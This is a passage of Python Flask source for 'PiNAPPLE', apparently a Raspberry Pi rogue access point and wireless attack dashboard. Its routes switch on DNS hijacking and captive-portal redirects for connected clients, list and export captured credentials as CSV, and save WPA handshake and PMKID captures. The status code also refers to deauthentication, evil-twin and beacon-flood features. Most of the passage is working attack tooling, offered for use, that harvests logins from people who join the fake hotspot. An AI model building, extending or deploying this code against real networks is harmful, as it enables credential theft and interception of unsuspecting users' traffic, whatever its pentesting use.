  box.appendChild(el);
  setTimeout(function(){{el.classList.add('out');setTimeout(function(){{el.remove();}},260);}},ms||3800);
}}
function busy(btn,on,label){{
  if(!btn)return;
  if(on){{btn.dataset.label=btn.textContent;btn.disabled=true;if(label)btn.textContent=label;}}
  else{{btn.disabled=false;if(btn.dataset.label){{btn.textContent=btn.dataset.label;delete btn.dataset.label;}}}}
}}
let lastErrorToast=0;
window.addEventListener('unhandledrejection',function(e){{
  const now=Date.now();
  if(now-lastErrorToast<30000)return;
  lastErrorToast=now;
  const msg=(e.reason&&e.reason.message)?e.reason.message:String(e.reason||'unknown error');
  toast('Request failed: '+msg,'error',6000);
}});
async function api(url,method,body){{
  const o={{method:method||'POST',headers:{{'Content-Type':'application/json','Accept':'application/json'}}}};
  if(body)o.body=JSON.stringify(body);
  try{{
    const r=await fetch(url,o);
    const txt=await r.text();
    let data=null;
    try{{data=txt?JSON.parse(txt):null;}}catch(e){{data=null;}}
    if(!r.ok){{
      return {{ok:false,status:'error',error:(data&&(data.error||data.message))||('HTTP '+r.status)}};
    }}
    return data||{{ok:true}};
  }}catch(e){{
    return {{ok:false,status:'error',error:'Network error: '+(e&&e.message?e.message:e)}};
  }}
}}
function labelTable(t){{
  if(!t)return;
  const heads=Array.prototype.map.call(t.querySelectorAll('thead th'),function(th){{return th.textContent.trim();}});
  if(!heads.length)return;
  t.querySelectorAll('tbody tr').forEach(function(tr){{
    Array.prototype.forEach.call(tr.children,function(td,i){{
      if(heads[i]&&!td.hasAttribute('data-label'))td.setAttribute('data-label',heads[i]);
    }});
  }});
}}
function labelTables(root){{
  (root||document).querySelectorAll('table.resp').forEach(labelTable);
}}
function toggleMenu(){{
  document.querySelector('.sidebar').classList.toggle('open');
}}
let gsBusy=false;
async function refreshGlobalStatus(){{
  if(document.visibilityState!=='visible')return;
  if(gsBusy)return;
  gsBusy=true;
  try{{
    const r=await fetch('/api/status/summary',{{headers:{{'Accept':'application/json'}}}});
    if(!r.ok)return;
    const d=await r.json();
    const el=document.getElementById('global-status');
    if(!el)return;
    if(d.wlan1_mode==='missing'){{
      el.textContent='wlan1 missing';el.className='gstatus err';return;
    }}
    let label='idle';
    let tab='probes';
    if(d.owner){{
      label=d.owner_label||d.owner;
      tab=(d.owner==='eviltwin')?'eviltwin':d.owner;
    }} else if(d.monitor){{
      if(d.monitor_phase==='waiting')label='waiting for wlan1';
      else if(d.monitor_phase==='error')label='monitor error';
      else label=d.monitor_stalled?'scan stalled':'scanning';
    }} else if(d.ap){{
      label='ready';
    }}
    const active=!!(d.owner||d.beacon||(d.deauth&&d.deauth.length)||d.pmkid||d.eviltwin||d.handshake);
    const warn=!d.owner && (d.monitor_stalled||d.monitor_phase==='error');
    el.textContent=(d.wlan1_mode||'wlan1')+' \u00b7 '+label;
    el.className='gstatus'+(warn?' err':(active?' busy':''));
    el.onclick=function(){{location.href='/wlan1?tab='+encodeURIComponent(tab);}};
  }}catch(e){{}}finally{{gsBusy=false;}}
}}
setInterval(refreshGlobalStatus,10000);refreshGlobalStatus();
labelTables();
</script>{js}</body></html>"""

def page(title, content, active='', js=''):
    acts = {k: '' for k in ['ov','cl','re','cr','ap','lo','se','da','hs','et','pm','bf','tr','pr','sv']}
    m = {'overview':'ov','clients':'cl','recon':'re','creds':'cr','ap':'ap','logs':'lo','settings':'se','wl':'da','deauth':'da','handshake':'hs','eviltwin':'et','pmkid':'pm','beacon':'bf','tracker':'tr','probes':'pr','saved':'sv'}
    if active in m:
        acts[m[active]] = 'active'
    return BASE.format(title=title, css=CSS, nav=NAV.format(**acts), content=content, js=js)

@app.route('/')
@require_auth
def overview():
    ap_ok = ap_running()
    dhcp_ok = service_status('pinapple-dhcp') or (ap_backend() == 'networkmanager' and ap_ok)
    ng_ok = service_status('nginx')
    try:
        wlan1_up = subprocess.run(['ip', 'link', 'show', 'wlan1'],
                                  capture_output=True, text=True, timeout=5).returncode == 0
    except Exception:
        wlan1_up = False
    wlan1_mode = get_wlan1_mode()
    mon_ok = wlan1_mode == 'monitor' or recon_active()
    monitor_state = read_json_file(os.path.join(LOG_DIR, 'monitor_status.json'), {})
    mon_phase = monitor_state.get('state') or ''
    if mon_phase == 'error':
        mon_badge, mon_label = 'br', 'ERROR'
    elif mon_phase == 'waiting':
        mon_badge, mon_label = 'bw', 'WAITING'
    elif mon_ok:
        mon_badge, mon_label = 'bg', ('MONITOR' if wlan1_mode == 'monitor' else 'READY')
    else:
        mon_badge, mon_label = ('br', 'DOWN') if not wlan1_up else ('bw', 'IDLE')
    clients = get_clients()
    i_on = os.path.exists(FLAG_INTERNET)
    d_on = os.path.exists(FLAG_DNS)
    p_on = os.path.exists(FLAG_PORTAL)
    try:
        uptime = subprocess.run(['uptime', '-p'], capture_output=True, text=True,
                                timeout=5).stdout.strip()
    except Exception:
        uptime = ''
    ssid = read_hostapd_conf().get('ssid','PiNAPPLE')
    eth_ip = iface_ip('eth0') or '—'
    wlan0_ip = iface_ip('wlan0') or '10.0.0.1'
    default_pw = False
    try:
        default_pw = check_password_hash(load_config().get('password_hash', ''), 'pinapple')
    except Exception:
        pass
    pw_warn = ('<div class="warnbox">The dashboard is still using the default password '
               '(<strong>pinapple</strong>). Change it in <a href="/settings" '
               'style="color:inherit;text-decoration:underline">Settings</a> before using this in public.</div>'
               if default_pw else '')
    checks = system_checks()
    bad_checks = [c for c in checks if not c[1]]
    check_rows = ''.join(
        '<div style="display:flex;justify-content:space-between;gap:12px;padding:7px 0;border-bottom:1px solid var(--bdr);font-size:0.8rem">'
        '<span>%s</span><span class="badge %s">%s</span></div>' % (
            html_escape(name), 'bg' if ok else 'br',
            html_escape('ready' if ok else detail))
        for name, ok, detail in checks)
    checks_html = (
        '<details class="card" style="margin-top:14px"><summary style="cursor:pointer;font-size:0.85rem;color:%s">'
        'System check &mdash; %s</summary><div style="margin-top:10px">%s'
        '<button class="btn btn-outline" style="margin-top:12px" onclick="repairServices(this)">'
        'Restart AP / DHCP / monitor / portal / nginx</button></div></details>' % (
            'var(--grn)' if not bad_checks else 'var(--warn)',
            'all tools ready' if not bad_checks else ('%d item(s) need attention' % len(bad_checks)),
            check_rows))
    recent = tail_file(EVENTS_LOG, 5000).splitlines()[-8:]
    activity_html = (
        '<details class="card" style="margin-top:14px"><summary style="cursor:pointer;font-size:0.85rem;color:var(--acc)">'
        'Recent activity</summary><pre style="margin-top:10px;white-space:pre-wrap;word-break:break-word;'
        'font-size:0.72rem;line-height:1.55;color:var(--dim);max-height:190px;overflow:auto">%s</pre>'
        '<a href="/logs" class="btn btn-outline" style="margin-top:10px">Open logs</a></details>' % (
            html_escape('\n'.join(recent)) if recent else 'No activity recorded yet.'))

    def sdot(ok): return '<span class="sdot {}"></span>'.format('on' if ok else 'off')
    def stxt(ok): return '<span style="color:var(--{})">&#9679; {}</span>'.format(
        'grn' if ok else 'red', 'Running' if ok else 'Stopped')

    c = """{pw_warn}<div class="cards">
  <a class="card card-link" href="/ap-control"><div class="card-title">Rogue AP</div>
    <div class="scrd">{ap_d}{ap_t}</div><div class="card-sub">SSID: {ssid}</div></a>
  <div class="card"><div class="card-title">DHCP/DNS</div>
    <div class="scrd">{dh_d}{dh_t}</div><div class="card-sub">dnsmasq</div></div>
  <div class="card"><div class="card-title">Portal (nginx)</div>
    <div class="scrd">{ng_d}{ng_t}</div><div class="card-sub">nginx</div></div>
  <a class="card card-link" href="/wlan1?tab=probes"><div class="card-title">Monitor</div>
    <div class="scrd">{mn_d}{mn_t}</div><div class="card-sub">wlan1 &middot; {wmode}</div></a>
  <a class="card card-link" href="/clients"><div class="card-title">Clients</div>
    <div class="card-value">{cc}</div><div class="card-sub">connected</div></a>
  <div class="card"><div class="card-title">Uptime</div>
    <div class="card-value" style="font-size:0.9rem;padding-top:8px">{up}</div>
    <div class="card-sub">{ip}</div></div>
</div>
{checks_html}
{activity_html}
<div style="display:grid;grid-template-columns:1fr;gap:16px">
<div>
<div class="sh"><span class="st">Network Controls</span></div>
<div class="tg"><div class="tl"><strong>Internet Passthrough</strong><span>NAT wlan0 &rarr; eth0</span></div>
  <button class="tbtn {ic}" onclick="tog('internet',this)">{it}</button></div>
<div class="tg"><div class="tl"><strong>DNS Hijack</strong><span>Redirect all DNS to portal</span></div>
  <button class="tbtn {dc}" onclick="tog('dns-hijack',this)">{dt}</button></div>
<div class="tg"><div class="tl"><strong>Portal Redirect</strong><span>Redirect HTTP (port 80) to the portal</span></div>
  <button class="tbtn {pc}" onclick="tog('portal-redirect',this)">{pt}</button></div>
</div>
<div>
<div class="sh"><span class="st">Interfaces</span></div>
<div class="twrap"><table class="resp">
<thead><tr><th>Interface</th><th>IP</th><th>Status</th></tr></thead>
<tbody>
<tr><td>eth0</td><td>{eip}</td><td><span class="badge {ethb}">UP</span></td></tr>
<tr><td>wlan0</td><td>{w0ip}</td><td><span class="badge {apb}">{aps}</span></td></tr>
<tr><td>wlan1</td><td>&mdash;</td><td><span class="badge {mnb}">{mns}</span></td></tr>
</tbody></table></div>
</div></div>""".format(
        pw_warn=pw_warn, checks_html=checks_html, activity_html=activity_html,
        ap_d=sdot(ap_ok), ap_t=stxt(ap_ok), ssid=html_escape(str(ssid)),
        dh_d=sdot(dhcp_ok), dh_t=stxt(dhcp_ok),
        ng_d=sdot(ng_ok), ng_t=stxt(ng_ok),
        mn_d=sdot(mon_ok), mn_t=stxt(mon_ok), wmode=html_escape(str(wlan1_mode)),
        cc=len(clients), up=html_escape(str(uptime)), ip=html_escape(str(eth_ip)),
        ic='ton' if i_on else 'toff', it='ON' if i_on else 'OFF',
        dc='ton' if d_on else 'toff', dt='ON' if d_on else 'OFF',
        pc='ton' if p_on else 'toff', pt='ON' if p_on else 'OFF',
        eip=html_escape(str(eth_ip)), ethb='bg' if eth_ip != '—' else 'br',
        w0ip=html_escape(str(wlan0_ip)),
        apb='bg' if ap_ok else 'br', aps='AP' if ap_ok else 'DOWN',
        mnb=mon_badge, mns=mon_label)

    js = """<script>
async function tog(f,btn){
  const on=btn.classList.contains('ton');
  const act=on?'off':'on';
  busy(btn,true);
  const r=await api('/api/toggle/'+f,'POST',{action:act});
  busy(btn,false);
  if(r.ok){
    btn.textContent=act==='on'?'ON':'OFF';
    btn.className='tbtn '+(act==='on'?'ton':'toff');
    toast((act==='on'?'Enabled ':'Disabled ')+f,'success');
  } else {
    toast('Error: '+(r.error||'unknown'),'error',6000);
  }
}
async function repairServices(btn){
  if(!confirm('Restart the AP, DHCP, monitor, portal and nginx? The hotspot will blip and this page may disconnect briefly.')) return;
  busy(btn,true,'Restarting services\u2026');
  const r=await api('/api/system/repair','POST');
  busy(btn,false);
  if(r && r.ok){
    const lines=(r.results||[]).map(function(x){return x.service+': '+x.result;}).join('; ');
    toast('Repair: '+lines,'success',9000);
    setTimeout(function(){location.reload();},1200);
  } else {
    toast('Repair failed: '+((r&&r.error)||'unknown'),'error',7000);
  }
}
</script>"""
    return page('Overview', c, 'overview', js)

@app.route('/api/toggle/<feature>', methods=['POST'])
@require_auth
def api_toggle(feature):
    data = request.json or {}
    action = data.get('action', 'on')
    if action not in ('on', 'off'):
        return jsonify({'ok': False, 'error': 'action must be on or off'})
    try:
        if feature == 'internet':
            subprocess.run(['/usr/local/bin/pinapple-internet', action],
                           check=True, timeout=25)
            if action == 'on':
                open(FLAG_INTERNET, 'w').close()
            else:
                try: os.remove(FLAG_INTERNET)
                except OSError: pass
        elif feature == 'dns-hijack':
            if ap_backend() != 'hostapd':
                return jsonify({'ok': False,
                                'error': 'DNS hijack needs the hostapd/dnsmasq stack; '
                                         'this install uses the NetworkManager hotspot.'})
            hc = '/etc/pinapple/dnsmasq-hijack.conf'
            if action == 'on':
                portal_ip = iface_ip('wlan0') or '10.0.0.1'
                with open(hc, 'w') as f: f.write('address=/#/%s\n' % portal_ip)
                open(FLAG_DNS, 'w').close()
            else:
                with open(hc, 'w') as f: f.write('# DNS hijack disabled\n')
                try: os.remove(FLAG_DNS)
                except OSError: pass
            r = subprocess.run(['systemctl', 'restart', 'pinapple-dhcp'],
                               capture_output=True, text=True, timeout=20)
            if r.returncode != 0:
                return jsonify({'ok': False,
                                'error': 'DHCP restart failed: %s' %
                                         ((r.stderr or r.stdout).strip() or 'unknown')})
        elif feature == 'portal-redirect':
            subprocess.run(['/usr/local/bin/pinapple-portal', action],
                           check=True, timeout=25)
            if action == 'on':
                open(FLAG_PORTAL, 'w').close()
            else:
                try: os.remove(FLAG_PORTAL)
                except OSError: pass
        else:
            return jsonify({'ok': False, 'error': 'unknown feature'})
        audit('Network toggle %s -> %s' % (feature, action))
        return jsonify({'ok': True, 'action': action})
    except Exception as e:
        audit('Network toggle %s failed: %s' % (feature, e), 'error')
        return jsonify({'ok': False, 'error': str(e)})

@app.route('/clients')
@require_auth
def clients_page():
    clients = get_clients()
    rows = ''.join('<tr><td><code>{}</code><div class="hint" style="margin:0">{}</div></td><td>{}</td><td>{}</td><td>{}</td></tr>'.format(
        html_escape(str(c['mac'])), html_escape(vendor_for_mac(str(c['mac']))),
        html_escape(str(c['ip'])),
        html_escape(str(c['hostname'])), html_escape(str(c['expires']))) for c in clients)
    if not rows:
        rows = '<tr><td colspan="4" style="text-align:center;color:var(--dim)">No clients connected</td></tr>'
    c = """<div class="sh"><span class="st">Connected Clients ({})</span>
<span style="font-size:0.75rem;color:var(--dim)">Auto-refresh 10s</span></div>
<div class="twrap"><table class="resp"><thead><tr><th>MAC</th><th>IP</th><th>Hostname</th><th>Expires</th></tr></thead>
<tbody id="ct">{}</tbody></table></div>""".format(len(clients), rows)
    js = """<script>
async function rc(){
  if(document.visibilityState!=='visible')return;
  const r=await fetch('/api/clients');const d=await r.json();
  const t=document.getElementById('ct');
  if(!t)return;
  if(!d.length){t.innerHTML='<tr><td colspan="4" style="text-align:center;color:var(--dim)">No clients connected</td></tr>';return;}
  t.innerHTML=d.map(c=>'<tr><td><code>'+esc(c.mac)+'</code>'+(c.vendor?'<div class="hint" style="margin:0">'+esc(c.vendor)+'</div>':'')+'</td><td>'+esc(c.ip)+'</td><td>'+esc(c.hostname)+'</td><td>'+esc(c.expires)+'</td></tr>').join('');
  labelTable(t.closest('table'));
}
setInterval(rc,10000);
</script>"""
    return page('Clients', c, 'clients', js)

@app.route('/api/clients')
@require_auth
def api_clients():
    return jsonify(with_vendor(get_clients(), 'mac'))

@app.route('/recon')
@require_auth
def recon_page():
    networks = get_recon()
    def eb(enc):
        enc = str(enc or 'Open')
        m = {'Open':'br','WEP':'bw','WPA':'bb','WPA2':'bg','WPA3':'bg'}
        return '<span class="badge {}">{}</span>'.format(m.get(enc,'bb'), html_escape(enc))
    def sig_label(n):
        try:
            value = n.get('signal', 0)
            unit = n.get('signal_unit') or ('dBm' if float(value) < 0 else '%')
        except (TypeError, ValueError):
            value, unit = n.get('signal', 0), ''
        return '{} {}'.format(html_escape(str(value)), html_escape(str(unit)))
    rows = ''.join('<tr><td>{}<div class="hint" style="margin:0">{}</div></td><td><code style="font-size:0.75rem">{}</code></td><td>{}</td><td>{}</td><td>{}</td><td style="font-size:0.75rem;color:var(--dim)">{}</td></tr>'.format(
        html_escape(str(n.get('ssid','') or '<hidden>')),
        html_escape(vendor_for_mac(str(n.get('bssid','')))),
        html_escape(str(n.get('bssid',''))), html_escape(str(n.get('channel',0))),
        sig_label(n), eb(n.get('encryption','Open')), html_escape(str(n.get('first_seen',''))))
        for n in sorted(networks, key=lambda x: x.get('signal',0), reverse=True))
    if not rows:
        rows = '<tr><td colspan="6" style="text-align:center;color:var(--dim)">No networks found. Click Scan.</td></tr>'
    c = """<div class="sh"><span class="st">Nearby Networks ({})</span>
<button class="btn btn-acc" onclick="triggerScan(this)" id="scan-btn">Scan Now</button>
</div>
<div class="warnbox" id="recon-hint" style="display:none"></div>
<div class="twrap"><table class="resp"><thead><tr><th>SSID</th><th>BSSID</th><th>Ch</th><th>Signal</th><th>Enc</th><th>First Seen</th></tr></thead>
<tbody id="rt">{}</tbody></table></div>""".format(len(networks), rows)
    js = """<script>
async function triggerScan(btn) {
  busy(btn,true,'Scanning...');
  try {
    const d = await api('/api/recon/scan','POST');
    if(d && d.ok) {
      const extra = d.kept ? ' (kept ' + d.kept + ' previous)' : '';
      toast('Scan complete: ' + (d.count||0) + ' networks' + extra, d.kept ? 'warn' : 'success');
    }
    else { toast('Scan failed: ' + ((d&&d.error)||'unknown'),'error',6000); }
    await rr();
  } finally { busy(btn,false); }
}
function reconRow(n){
  const mc={Open:'br',WEP:'bw',WPA:'bb',WPA2:'bg',WPA3:'bg'};
  const sig=(n.signal||0)+' '+(n.signal_unit||((n.signal||0)<0?'dBm':'%'));
  const vendor=n.vendor?'<div class="hint" style="margin:0">'+esc(n.vendor)+'</div>':'';
  return '<tr><td>'+esc(n.ssid||'<hidden>')+vendor+'</td><td><code style="font-size:0.75rem">'+esc(n.bssid||'')+'</code></td><td>'+esc(n.channel||0)+'</td><td>'+esc(sig)+'</td><td><span class="badge '+(mc[n.encryption]||'bb')+'">'+esc(n.encryption||'?')+'</span></td><td style="font-size:0.75rem;color:var(--dim)">'+esc(n.first_seen||'')+'</td></tr>';
}
async function rr(){
  if(document.visibilityState!=='visible')return;
  const r=await fetch('/api/recon');const d=await r.json();
  const t=document.getElementById('rt');
  if(!t)return;
  if(!d.length){t.innerHTML='<tr><td colspan="6" style="text-align:center;color:var(--dim)">No networks found. Click Scan.</td></tr>';return;}
  t.innerHTML=[...d].sort((a,b)=>b.signal-a.signal).map(reconRow).join('');
  labelTable(t.closest('table'));
}
setInterval(rr,30000);
</script>"""
    return page('Recon', c, 'recon', js)

@app.route('/api/recon')
@require_auth
def api_recon():
    return jsonify(with_vendor(get_recon(), 'bssid'))

@app.route('/api/recon/scan', methods=['POST'])
@require_auth
def api_recon_scan():
    reconcile_wlan1_owner()
    if _wlan1_owner[0]:
        label = WLAN1_OWNER_NAMES.get(_wlan1_owner[0], _wlan1_owner[0])
        return jsonify({'ok': False,
                        'error': f'wlan1 is busy with {label}. Stop it before scanning.'})

    paused = False
    notes = []
    try:
        # Pause whichever recon/scan service is actually active, then bring
        # exactly that service back when the managed-mode scan is done.
        paused = pause_recon()

        mode_ok, mode_msg = set_wlan1_mode('managed')
        if not mode_ok:
            return jsonify({'ok': False,
                            'error': 'could not switch wlan1 to managed mode: ' + mode_msg})

        networks = []
        source = ''
        if shutil.which('nmcli'):
            try:
                managed = subprocess.run(
                    ['nmcli', 'dev', 'set', 'wlan1', 'managed', 'yes'],
                    capture_output=True, text=True, timeout=10)
                if managed.returncode != 0:
                    detail = (managed.stderr or managed.stdout).strip().splitlines()
                    notes.append('NetworkManager: %s' %
                                 (detail[-1] if detail else 'could not manage wlan1'))
                else:
                    subprocess.run(['nmcli', 'dev', 'wifi', 'rescan'],
                                   capture_output=True, timeout=10)
                    time.sleep(2)
                    r = subprocess.run(
                        ['nmcli', '-t', '-f', 'SSID,BSSID,CHAN,SIGNAL,SECURITY',
                         'dev', 'wifi', 'list'],
                        capture_output=True, text=True, timeout=20)
                    if r.returncode != 0:
                        detail = (r.stderr or r.stdout).strip().splitlines()
                        notes.append('nmcli: %s' %
                                     (detail[-1] if detail else 'scan failed'))
                    else:
                        networks = parse_nmcli_wifi(r.stdout)
                        source = 'nmcli'
            except (OSError, subprocess.SubprocessError) as exc:
                notes.append('nmcli: %s' % exc)
        else:
            notes.append('NetworkManager (nmcli) is not installed')

        if not networks:
            # Fallback for images without NetworkManager: scan directly with iw.
            iw_networks, iw_error = scan_wlan1_with_iw()
            if iw_networks:
                networks = iw_networks
                source = 'iw'
            elif iw_error:
                notes.append('iw: %s' % iw_error)

        if not networks:
            existing = get_recon()
            detail = '; '.join(notes) if notes else 'no networks found'
            if existing:
                return jsonify({'ok': True, 'count': 0, 'kept': len(existing),
                                'note': 'no new networks found; kept the previous scan',
                                'details': detail})
            return jsonify({'ok': False, 'error': detail})

        os.makedirs(os.path.dirname(SCAN_JSON), exist_ok=True)
        with open(SCAN_JSON, 'w') as f:
            json.dump(networks, f, indent=2)
        audit('Recon scan complete: %d networks (%s)' % (len(networks), source))
        payload = {'ok': True, 'count': len(networks), 'source': source}
        if notes:
            payload['details'] = '; '.join(notes)
        return jsonify(payload)
    except subprocess.SubprocessError as exc:
        return jsonify({'ok': False, 'error': 'scan command failed: %s' % exc})
    except Exception as e:
        return jsonify({'ok': False, 'error': str(e)})
    finally:
        try:
            subprocess.run(['nmcli', 'dev', 'set', 'wlan1', 'managed', 'no'],
                           capture_output=True, timeout=10)
        except Exception:
            pass
        if paused and _recon_stopped[0]:
            resume_recon()
        else:
            restore_wlan1_idle()


@app.route('/creds')
@require_auth
def creds_page():
    entries = get_creds()
    def fd(e):
        return ', '.join('{}:{}'.format(html_escape(str(k)), html_escape(str(v)))
                         for k,v in e.get('data',{}).items())
    rows = ''.join('<tr><td style="font-size:0.75rem">{}</td><td>{}</td><td><code style="font-size:0.75rem">{}</code></td><td><span class="badge bb">{}</span></td><td style="font-size:0.8rem">{}</td></tr>'.format(
        html_escape(str(e.get('timestamp',''))), html_escape(str(e.get('client_ip',''))),
        html_escape(str(e.get('client_mac',''))), html_escape(str(e.get('portal_type',''))), fd(e)) for e in entries)
    if not rows:
        rows = '<tr><td colspan="5" style="text-align:center;color:var(--dim)">No credentials captured yet</td></tr>'
    c = """<div class="sh"><span class="st">Captured Credentials ({})</span>
<a href="/api/creds/export" class="btn btn-outline" style="font-size:0.8rem">Export CSV</a></div>
<div class="twrap"><table class="resp"><thead><tr><th>Timestamp</th><th>IP</th><th>MAC</th><th>Type</th><th>Data</th></tr></thead>
<tbody>{}</tbody></table></div>""".format(len(entries), rows)
    return page('Credentials', c, 'creds')

@app.route('/api/creds/export')
@require_auth
def export_creds():
    entries = get_creds()
    output = io.StringIO()
    w = csv.writer(output)
    w.writerow(['timestamp','client_ip','client_mac','portal_type','data'])
    for e in entries:
        w.writerow([e.get('timestamp',''), e.get('client_ip',''),
                   e.get('client_mac',''), e.get('portal_type',''),
                   json.dumps(e.get('data',{}))])
    output.seek(0)
    return Response(output.getvalue(), mimetype='text/csv',
                   headers={'Content-Disposition': 'attachment; filename=pinapple_creds.csv'})


@app.route('/api/saved')
@require_auth
def api_saved():
    items = saved_items()
    return jsonify({'items': items, 'count': len(items)})


@app.route('/api/saved/snapshot', methods=['POST'])
@require_auth
def api_saved_snapshot():
    source = str((request.json or {}).get('source', '')).strip().lower()
    try:
        item = saved_snapshot(source)
    except Exception as exc:
        audit('Snapshot failed: %s' % exc, 'error')
        return jsonify({'ok': False, 'error': 'could not write snapshot: %s' % exc}), 500
    if not item:
        return jsonify({'ok': False, 'error': 'unknown snapshot source'})
    return jsonify({'ok': True, 'item': item})


@app.route('/api/saved/download/<item_id>')
@require_auth
def api_saved_download(item_id):
    item = saved_find(item_id)
    if not item:
        return Response('Not found', 404)
    path = saved_path(item)
    if not path:
        return Response('File missing', 404)
    try:
        with open(path, 'rb') as handle:
            data = handle.read()
    except OSError:
        return Response('File missing', 404)
    filename = os.path.basename(item.get('file', 'download.bin'))
    return Response(data, mimetype='application/octet-stream',
                    headers={'Content-Disposition': 'attachment; filename=%s' % filename})


@app.route('/api/saved/delete', methods=['POST'])
@require_auth
def api_saved_delete():
    item_id = str((request.json or {}).get('id', ''))
    try:
        ok = saved_delete(item_id)
    except OSError as exc:
        return jsonify({'ok': False, 'error': 'could not delete: %s' % exc}), 500
    return jsonify({'ok': ok, 'error': '' if ok else 'saved item not found'})


@app.route('/saved')
@require_auth
def saved_page():
    items = saved_items()
    colors = {'handshake':'bg', 'pmkid':'bw', 'recon':'bb', 'probes':'bb',
              'tracker':'bb', 'clients':'bb', 'creds':'bw'}
    cards = []
    for item in items:
        created = str(item.get('created', '')).replace('T', ' ')
        title = html_escape(str(item.get('title', '')))
        subtitle = html_escape(str(item.get('subtitle', '')))
        badge = colors.get(str(item.get('type')), 'bb')
        item_id = html_escape(str(item.get('id', '')))
        cards.append(
            '<div class="card saved-item" style="padding:14px" data-search="%s %s %s">'
            '<div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap">'
            '<span class="badge %s">%s</span>'
            '<strong style="flex:1;min-width:140px;overflow-wrap:anywhere">%s</strong>'
            '<span class="hint" style="margin:0">%s &middot; %s</span></div>'
            '<div class="hint">%s</div>'
            '<div style="display:flex;gap:8px;margin-top:10px;flex-wrap:wrap">'
            '<a class="btn btn-acc" href="/api/saved/download/%s" download>&#8681; Download</a>'
            '<button class="btn btn-outline" onclick="deleteSaved(\'%s\')">Delete</button>'
            '</div></div>' % (
                html_escape(str(item.get('title', ''))), html_escape(str(item.get('type', ''))),
                html_escape(str(item.get('subtitle', ''))),
                badge, html_escape(str(item.get('type', 'file'))), title,
                html_escape(created), human_size(item.get('size')),
                subtitle or '&nbsp;', item_id, item_id))
    if not cards:
        cards.append(
            '<div class="card"><div class="hint" style="margin:0">'
            'Nothing saved yet. Capture a handshake or PMKID, or save a snapshot below.'
            '</div></div>')

    c = """<div class="sh"><span class="st">Saved data</span>
<span class="badge bb">{count} items</span></div>
<p class="hint" style="margin:-6px 0 14px">Handshakes, PMKID hashes, and readable snapshots of collected data. Files are kept on the Pi and can be downloaded from any device on the hotspot.</p>
<div class="card">
  <div class="card-title">Save a snapshot</div>
  <div class="grid2" style="margin-top:8px">
    <button class="btn btn-outline" onclick="saveSnapshot('recon',this)">Recon networks</button>
    <button class="btn btn-outline" onclick="saveSnapshot('probes',this)">Probe requests</button>
    <button class="btn btn-outline" onclick="saveSnapshot('tracker',this)">Client tracker</button>
    <button class="btn btn-outline" onclick="saveSnapshot('clients',this)">Connected clients</button>
    <button class="btn btn-outline" onclick="saveSnapshot('creds',this)">Credentials (JSON)</button>
    <a class="btn btn-outline" href="/api/creds/export">Credentials (CSV)</a>
  </div>
  <div class="hint">Snapshots are small readable JSON files, not log dumps.</div>
</div>
<input id="saved-filter" class="bf-input" style="margin:14px 0" placeholder="Filter saved items" oninput="filterSaved(this.value)" autocomplete="off">
<div id="saved-list" style="display:flex;flex-direction:column;gap:10px">{cards}</div>""".format(
        count=len(items), cards=''.join(cards))
    js = """<script>
async function saveSnapshot(source, btn){
  busy(btn,true,'Saving\\u2026');
  const r=await api('/api/saved/snapshot','POST',{source:source});
  busy(btn,false);
  if(r && r.ok){ toast('Saved ' + source + ' snapshot','success'); setTimeout(function(){location.reload();},500); }
  else { toast('Could not save snapshot: ' + ((r&&r.error)||'unknown'),'error',6000); }
}
async function deleteSaved(id){
  if(!confirm('Delete this saved item? This removes the file from the Pi.')) return;
  const r=await api('/api/saved/delete','POST',{id:id});
  if(r && r.ok){ toast('Saved item deleted','success'); setTimeout(function(){location.reload();},400); }
  else { toast('Could not delete: ' + ((r&&r.error)||'unknown'),'error',6000); }
}
function filterSaved(q){
  q=(q||'').toLowerCase();
  document.querySelectorAll('.saved-item').forEach(function(el){
    el.style.display=(!q || (el.dataset.search||'').toLowerCase().indexOf(q)>=0) ? '' : 'none';
  });
}
</script>"""
    return page('Saved', c, 'saved', js)

@app.route('/ap-control', methods=['GET','POST'])
@require_auth
def ap_control():
    msg = ''
    backend = ap_backend()
    conn = nm_hotspot_connection() if backend == 'networkmanager' else ''
    tx_cur = read_ap_txpower()

    if request.method == 'POST':
        action = request.form.get('action')
        try:
            if action in ('start', 'stop'):
                r = None
                if backend == 'hostapd':
                    r = subprocess.run(['systemctl', action, 'pinapple-ap'],
                                       capture_output=True, text=True, timeout=20)
                elif conn:
                    r = subprocess.run(['nmcli', 'connection',
                                        'up' if action == 'start' else 'down', conn],
                                       capture_output=True, text=True, timeout=25)
                if r is None:
                    msg = '<span style="color:var(--red)">No AP backend is available.</span>'
                elif r.returncode == 0:
                    if action == 'start':
                        apply_ap_txpower(tx_cur)
                        subprocess.run(['systemctl', 'restart', 'pinapple-dhcp'],
                                       capture_output=True, timeout=15)
                        msg = '<span style="color:var(--grn)">AP started.</span>'
                        audit('AP started')
                    else:
                        msg = '<span style="color:var(--warn)">AP stopped.</span>'
                        audit('AP stopped', 'warn')
                else:
                    msg = '<span style="color:var(--red)">AP {} failed: {}</span>'.format(
                        action, html_escape((r.stderr or r.stdout).strip() or 'unknown'))

            elif action == 'config':
                ssid = (request.form.get('ssid') or 'PiNAPPLE')[:32]
                try:
                    channel = int(request.form.get('channel', 6))
                except (TypeError, ValueError):
                    channel = 0
                mode = 'wpa2' if request.form.get('mode') == 'wpa2' else 'open'
                txpower = request.form.get('txpower', 'medium')
                if txpower not in TX_POWER_DBM:
                    txpower = 'medium'

                if not 1 <= channel <= 14:
                    msg = '<span style="color:var(--red)">Channel must be between 1 and 14.</span>'
                elif backend == 'networkmanager' and not conn:
                    msg = '<span style="color:var(--red)">No NetworkManager hotspot connection was found on wlan0.</span>'
                elif backend == 'networkmanager' and mode == 'open' and request.form.get('mode'):
                    msg = '<span style="color:var(--warn)">Open mode is not changed on the NetworkManager hotspot; Wi-Fi security is managed by that connection.</span>'
                else:
                    if backend == 'hostapd':
                        previous = ''
                        try:
                            with open(HOSTAPD_CONF) as handle:
                                previous = handle.read()
                        except OSError:
                            pass
                        try:
                            write_hostapd_conf(ssid, channel, mode, txpower)
                            with open(AP_TXPOWER_FILE, 'w') as f:
                                f.write(txpower)
                        except OSError as exc:
                            msg = '<span style="color:var(--red)">Could not write config: {}</span>'.format(html_escape(str(exc)))
                            r = None
                        else:
                            r = subprocess.run(['systemctl', 'restart', 'pinapple-ap'],
                                               capture_output=True, text=True, timeout=25)
                            if r.returncode == 0:
                                subprocess.run(['systemctl', 'restart', 'pinapple-dhcp'],
                                               capture_output=True, timeout=15)
                            elif previous:
                                # A rejected config must not leave the AP dead.
                                try:
                                    with open(HOSTAPD_CONF, 'w') as handle:
